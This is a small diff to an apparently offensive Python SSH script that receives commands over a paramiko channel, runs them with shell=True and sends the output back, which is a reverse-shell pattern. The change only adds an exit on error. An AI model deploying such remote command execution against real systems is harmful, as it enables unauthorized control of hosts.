@@ -1,3 +1,4 @@
+import sys
 import paramiko
 import threading
 import subprocess
@@ -17,7 +18,8 @@ while True:
     try:
         CMD = subprocess.check_output(str(command).strip('b\'\''), shell=True)
         chan.send(CMD)
-    except Exception as e:
+    except (Exception, KeyboardInterrupt) as e:
         chan.send(str(e))
+        sys.exit(1)
 print (chan.recv(1024))
 client.close
